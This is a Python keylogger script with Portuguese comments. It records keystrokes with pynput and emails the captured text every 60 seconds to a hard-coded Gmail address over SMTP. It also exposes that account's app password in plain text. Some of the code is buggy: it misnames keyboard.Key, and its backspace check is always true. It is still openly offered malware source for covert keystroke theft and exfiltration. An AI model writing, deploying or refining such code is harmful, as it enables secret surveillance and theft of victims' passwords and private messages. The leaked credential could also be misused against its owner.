from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

from keylogger import on_press

log = ""

#Configurações do email
EMAIL_ORIGEM = "patcholasat@gmail.com" 
EMAIL_DESTINO = "patcholasat@gmail.com"
SENHA_EMAIL = "staz jjbm alzr lywe"  


def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados Capturados Keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)

        log = ""
        #agendar envio a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log+= key.char
    except AttributeError:
        if key == keyboard.Key.space:
                    log += " "
        elif key == keyboard.key.enter:
                    log += "\n"
        elif keyboard.key.backspace:
                    log+="[<]"
        else: 
                    pass #ignorar teclas especiais

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()